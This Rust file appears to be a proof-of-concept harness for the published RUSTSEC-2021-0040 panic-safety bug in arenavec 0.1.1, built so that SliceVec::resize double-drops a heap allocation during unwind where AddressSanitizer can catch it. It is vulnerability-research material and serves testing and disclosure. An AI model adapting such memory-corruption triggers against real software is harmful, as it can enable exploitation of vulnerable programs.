//! Mechanical payload-strengthening adapter for Rudra-PoC 0109,
//! RUSTSEC-2021-0040 (`arenavec` 0.1.1).
//!
//! The published root cause is unchanged: `SliceVec::resize` drops elements
//! before publishing the shorter length. The boxed field is dropped before a
//! later field panics, giving ASan an allocator-visible second drop during
//! unwind.

#![forbid(unsafe_code)]

use arenavec::rc::{Arena, SliceVec};
use arenavec::ArenaBacking;
use std::sync::atomic::{AtomicBool, Ordering};

static PANIC_ONCE: AtomicBool = AtomicBool::new(true);

#[derive(Clone)]
struct PanicAfterPayloadDrop(bool);

impl Drop for PanicAfterPayloadDrop {
    fn drop(&mut self) {
        if self.0 && PANIC_ONCE.swap(false, Ordering::SeqCst) {
            panic!("published panic-safety trigger");
        }
    }
}

#[derive(Clone)]
struct HeapPayload {
    // Rust drops fields in declaration order: this allocation is released
    // before the following panic marker runs.
    _owned: Box<u64>,
    panic_after_payload: PanicAfterPayloadDrop,
}

impl HeapPayload {
    fn new(value: u64, panic_on_drop: bool) -> Self {
        Self {
            _owned: Box::new(value),
            panic_after_payload: PanicAfterPayloadDrop(panic_on_drop),
        }
    }
}

const DEFAULT_CAPACITY: usize = 4096 << 8;

fn main() {
    let arena = Arena::init_capacity(ArenaBacking::SystemAllocation, DEFAULT_CAPACITY).unwrap();
    let mut values: SliceVec<HeapPayload> = SliceVec::new(arena.inner());
    values.push(HeapPayload::new(0, false));
    values.push(HeapPayload::new(1, true));
    values.resize(1, HeapPayload::new(99, false));
}
